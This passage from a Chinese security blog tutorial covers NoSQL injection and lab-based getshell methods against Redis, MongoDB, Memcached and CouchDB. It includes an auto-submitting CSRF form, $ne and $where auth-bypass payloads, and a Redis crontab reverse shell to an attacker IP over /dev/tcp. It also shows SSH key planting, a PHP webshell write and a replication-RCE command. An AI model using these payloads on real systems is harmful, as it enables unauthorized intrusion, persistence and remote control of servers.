<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot; http:&#x2F;&#x2F;safe.internal. db&#x2F;hr&#x2F;admins&#x2F;_insert&quot; method&#x3D;&quot;POST&quot; name&#x3D;&quot;csrf&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;docs&quot; value&#x3D;&quot; [&#123;&quot;username&quot;:attacker&#125;]&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo4rz979kj30wg0l8k5n.jpg" alt="image-20200712133641169"></p>
<p>藏在防火墙后的内部网络内的用户被欺骗访问一个恶意外部网页，这将导致在内部网络的NoSQL数据库的 REST API 上执行非预期的查询。</p>
<p>第二，攻击者必须通过网络诱骗或感染用户经常访问的网站欺骗用户进入被感染的网站。最后，用户必须许可访问Mongoose HTTP接口。</p>
<p>用这种方式，攻击者不必进入内部网络即可执行操作，在本例中，是插入新数据到位于内部网络中的数据库中。这种攻击执行很简单，但要求攻击者要提前侦察去识别主机、数据库名称，等等。</p>
<h4 id="7、node-js注入-靶场"><a href="#7、node-js注入-靶场" class="headerlink" title="7、node.js注入(靶场)"></a>7、node.js注入(靶场)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">靶场下载地址：https:&#x2F;&#x2F;github.com&#x2F;Charlie-belmer&#x2F;vulnerable-node-app</span><br><span class="line">环境：node.js、Mongodb</span><br><span class="line">进入APP目录下使用命令: node server.js启动环境</span><br><span class="line">PS：若提示错误，使用npm install 下载报错模块</span><br></pre></td></tr></table></figure>

<h5 id="登录绕过"><a href="#登录绕过" class="headerlink" title="登录绕过"></a>登录绕过</h5><p>此页面注入可使用重言式进行绕过登录</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggntfjlv2qj311m0mqgoh.jpg" alt="image-20200712070413889"></p>
<p>使用burp抓包，如下图</p>
<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggm1f0fqb7j30rh0b3gn8.jpg" alt="image-20200710180920921"></h4><p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改password</span><br><span class="line">	&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</span><br><span class="line">修改</span><br><span class="line">	&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</span><br><span class="line">都可绕过账户密码登录</span><br></pre></td></tr></table></figure>

<p>注入成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggm1g72jkej30rl09vgn8.jpg" alt="image-20200710181032327"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnu5bax01j31jg0ikwj6.jpg" alt="image-20200712072859566"></p>
<h5 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a>where注入</h5><p>此页面类似联合查询注入</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnu6wbltbj31n80mitcc.jpg" alt="image-20200712073030844"></p>
<p>注入恶意代码使得表达式为真来获取所有用户名</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&#39; || &#39;1&#39;&#x3D;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">根据用户输入程序构造如下代码，带入数据库查询后返回所有用户信息</span><br><span class="line">’$where‘:’this.username‘ &#x3D;&#x3D; &#39;&#39; || &#39;1&#39;&#x3D;&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnue2b1smj329t0u0qab.jpg" alt="image-20200712073723584"></p>
<h3 id="0x03-NoSQL数据库GETSHELL方法"><a href="#0x03-NoSQL数据库GETSHELL方法" class="headerlink" title="0x03 NoSQL数据库GETSHELL方法"></a>0x03 NoSQL数据库GETSHELL方法</h3><p>老生常谈，其实网上有很多关于Redis或Mongodb的漏洞利用方法，不过本文既然是讲NoSQL，Redis和Mongodb算是NoSQL数据库中的代表性数据库，所以本文也总结一下利用方法。</p>
<h4 id="Redis-getshell方法总结"><a href="#Redis-getshell方法总结" class="headerlink" title="Redis getshell方法总结"></a>Redis getshell方法总结</h4><p>环境搭建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">下载：wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.9.tar.gz</span><br><span class="line">解压：tar -zxvf redis-4.0.9.tar.gz</span><br><span class="line">cd redis-4.0.9</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">make install</span><br><span class="line">依次执行</span><br><span class="line"></span><br><span class="line">配置redis.conf</span><br><span class="line">注释 bind 127.0.0.1</span><br><span class="line">关闭保护模式，将protected-mode yes改为no</span><br></pre></td></tr></table></figure>

<p>未授权连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 0.0.0.0 -p 6379 连接上靶机</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0hlawcxj315w0pk775.jpg" alt="image-20200712110823533"></p>
<h5 id="crontab-计划任务"><a href="#crontab-计划任务" class="headerlink" title="crontab-计划任务"></a>crontab-计划任务</h5><p>本机监听</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0ji6dacj30ro07wjrn.jpg" alt="image-20200712111013635"></p>
<p>redis</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.239.136&#x2F;8888 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0ils1rhj323s0g8gtz.jpg" alt="image-20200712110920900"></p>
<p>接收到反弹shell</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0u4fj3hj30w40u0tfb.jpg" alt="image-20200712112025614"></p>
<h5 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h5><p>本地生成秘钥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd .ssh</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h  192.168.239.129 -x set crackit</span><br></pre></td></tr></table></figure>

<p>redis</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  192.168.239.129</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config get dir</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">最后本机运行</span><br><span class="line">ssh -i id_rsa root@x.x.x.x</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0dm7g43j32740sun4e.jpg" alt="image-20200712110433966"></p>
<h5 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  192.168.239.129</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo18p96skj30ue092jsd.jpg" alt="image-20200712113426626"></p>
<p>写入成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo192t9zxj31m60u079y.jpg" alt="image-20200712113446908"></p>
<h5 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">so文件：git clone https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;RedisModules-ExecuteCommand(下载后进入目录make，获取恶意so文件)</span><br><span class="line">python脚本：git clone https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;redis-rce.git</span><br><span class="line"></span><br><span class="line">执行命令：python3 redis-rce.py -r 192.168.239.129 -p 6379 -L 192.168.239.136 -f module.so</span><br></pre></td></tr></table></figure>

<p>成功获取shell</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo2c4z28qj31780u07b9.jpg" alt="image-20200712121220182"></p>
<h4 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h4><p>目标机：ubuntu</p>
<p>攻击机：kali</p>
<p>使用docker搭建漏洞环境</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">拉取环境</span><br><span class="line">	sudo docker pull mongo</span><br><span class="line">查看镜像</span><br><span class="line">	sudo docker images</span><br><span class="line">启动容器</span><br><span class="line">	sudo docker run -d -p 27017:27017 --name mongodb mongo</span><br><span class="line">查看mongodb容器IP</span><br><span class="line">	sudo $docker inspect mongodb | grep IPAddress</span><br><span class="line">映射docker mongodb 27917端口到本机27917端口上</span><br><span class="line">	sudo iptables -t nat -A DOCKER -p tcp --dport 27917 -j DNAT --to-destination 172.17.0.2:27017</span><br></pre></td></tr></table></figure>

<p>nmap扫描</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggqxb3t0dfj31100aw75k.jpg" alt="image-20200714233501502"></p>
<p>至此，漏洞环境搭建成功</p>
<p>使用metasploit扫描漏洞是否存在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫描模块</span><br><span class="line">	auxiliary&#x2F;scanner&#x2F;mongodb&#x2F;mongodb_login</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggqxx5fpgqj31v00jk451.jpg" alt="image-20200714235614189"></p>
<p>使用Mongodb连接工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载地址：https:&#x2F;&#x2F;nosqlbooster.com&#x2F;downloads</span><br></pre></td></tr></table></figure>

<p>输入靶机IP，连接即可</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyew6oyvj314y0oatcu.jpg" alt="image-20200715001317487"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyee7jevj31bo0u07hm.jpg" alt="image-20200715001247581"></p>
<p>连接成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyg2p0zgj31e00u0qay.jpg" alt="image-20200715001424500"></p>
<h4 id="Memcached未授权访问"><a href="#Memcached未授权访问" class="headerlink" title="Memcached未授权访问"></a>Memcached未授权访问</h4><p>目标机:Centos7</p>
<p>环境搭建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">安装：</span><br><span class="line">	sudo yum install memcached</span><br><span class="line">启动服务</span><br><span class="line">	sudo memcached -d -m 128 -p 11211 -u root</span><br><span class="line">查看是否启动服务</span><br><span class="line">	sudo ps -ef | grep memcache</span><br><span class="line">安装客户端</span><br><span class="line">	sudo yum install php-memcached</span><br><span class="line">重启apache服务</span><br><span class="line">	service apache2 restart</span><br><span class="line">查看端口开放</span><br><span class="line">	netstat -an |more</span><br></pre></td></tr></table></figure>

<p>当显示如下图，漏洞环境搭建成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggs2g3lpqbj31420m4tas.jpg" alt="image-20200715231820276"></p>
<p>漏洞利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.239.137 11211</span><br></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggs2i2rhykj31420iamya.jpg" alt="image-20200715232019503"></p>
<h4 id="CouchDB未授权访问"><a href="#CouchDB未授权访问" class="headerlink" title="CouchDB未授权访问"></a>CouchDB未授权访问</h4><p>目标机：Kali</p>
<p>环境搭建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;vulhub&#x2F;vulhub&#x2F;master&#x2F;couchdb&#x2F;CVE-2017-12636&#x2F;docker-compose.yml</span><br><span class="line"></span><br><span class="line">下载环境并启动</span><br><span class="line">	docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>如果访问不了网址,新建docker-compose.yml，将如下代码复制进去即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">version: &#39;2&#39;</span><br><span class="line">services:</span><br><span class="line">  couchdb:</span><br><span class="line">    image: vulhub&#x2F;couchdb:1.6.0 </span><br><span class="line">    ports:</span><br><span class="line">      - &quot;5984:5984&quot;</span><br></pre></td></tr></table></figure>

<p>环境搭建成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggt6qhomutj31qw0dm0u1.jpg" alt="image-20200716223216594"></p>
<p>漏洞利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.239.129:5984&#x2F;_config				&#x2F;&#x2F;网址后面加上_config，出现如下图说明存在漏洞</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggt6r4c6f3j31if0u07bd.jpg" alt="image-20200716223254136"></p>
<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>本文大概介绍了NoSQL注入的分类，主要讲的是MongoDB数据库注入，背负式和跨域违规，网上资料算是极少，只能从其他文章中摘录放到本文章内。</p>
<p>不管是SQL注入还是Nosql注入，漏洞产生原因都是未对用户输入的数据进行过滤或过滤不严谨，虽然NoSQL不使用SQL语句，但可根据程序语言来进行注入，不管是PHP，Node.JS或其他语言，没有做好数据过滤照样存在注入，果然世上没有绝对安全的应用，别问，问就是研究的不够深。</p>
<h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p><a href="https://www.jianshu.com/p/25fb182ef52c" target="_blank" rel="noopener">https://www.jianshu.com/p/25fb182ef52c</a></p>
<p><a href="https://blog.csdn.net/qq_27446553/article/details/79379481?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-79379481.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/79379481?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-79379481.nonecase</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1602092" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1602092</a></p>
<p><a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/" target="_blank" rel="noopener">https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a></p>
<p><a href="https://scotch.io/@401/mongodb-injection-in-nodejs" target="_blank" rel="noopener">https://scotch.io/@401/mongodb-injection-in-nodejs</a></p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
        <div class="declare">
          <ul class="post-copyright">
            <li>
              <i class="ri-copyright-line"></i>
              <strong>版权声明： </strong>
              本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
            </li>
          </ul>
        </div>
        
    <footer class="article-footer">
      
          
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://timeshu.github.io/2020/06/23/NoSql%E6%95%B0%E6%8D%AE%E5%BA%93getShell%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>
      
      

    </footer>

  </div>

  
  
  <nav class="article-nav">
    
      <a href="/2020/06/27/jwt%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            jwt学习
          
        </div>
      </a>
    
    
      <a href="/2020/06/22/xyhcms%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">xyhcms审计学习</div>
      </a>
    
  </nav>


  

  
  
<!-- valine评论 -->
<div id="vcomments-box">
    <div id="vcomments">
    </div>
</div>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src='https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: '',
        app_key: '',
        path: window.location.pathname,
        notify: false,
        verify: false,
        avatar: 'monsterid',
        placeholder: '给我的文章加点评论吧~',
        recordIP: true
    });
    const infoEle = document.querySelector('#vcomments .info');
    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
        infoEle.childNodes.forEach(function (item) {
            item.parentNode.removeChild(item);
        });
    }
</script>
<style>
    #vcomments-box {
        padding: 5px 30px;
    }

    @media screen and (max-width: 800px) {
        #vcomments-box {
            padding: 5px 0px;
        }
    }

    #vcomments-box #vcomments {
        background-color: #fff;
    }

    .v .vlist .vcard .vh {
        padding-right: 20px;
    }

    .v .vlist .vcard {
        padding-left: 10px;
    }
</style>

  

  
  
  
  
  

</article>
</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2015-2021
        <i class="ri-heart-fill heart_icon"></i> John Doe
      </li>
    </ul>
    <ul>
      <li>
        
        
        
        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
        <span class="division">|</span>
        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s4.cnzz.com/z_stat.php?id=1278951134&amp;web_id=1278951134'></script>
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Time"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/suibi">随笔</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i></p>
  <div class="reward-box">
    
    
  </div>
</div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>

<!-- Subtitle -->

<script>
  try {
    var typed = new Typed("#subtitle", {
      strings: ['生死看淡，不服就干', '只要学不死，就往死里学', '坚持总会胜利，不死终会出头'],
      startDelay: 0,
      typeSpeed: 200,
      loop: true,
      backSpeed: 100,
      showCursor: true
    });
  } catch (err) {
    console.log(err)
  }
</script>

<!-- Tocbot -->


<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: '.tocbot',
    contentSelector: '.article-entry',
    headingSelector: 'h1, h2, h3, h4, h5, h6',
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: 'main',
    positionFixedSelector: '.tocbot',
    positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto'
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<!-- ClickLove -->


<script src="/js/clickLove.js"></script>


<!-- ClickBoom -->


<script src="/js/clickBoom.js"></script>


<!-- CodeCopy -->


<link rel="stylesheet" href="/css/clipboard.css">

<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
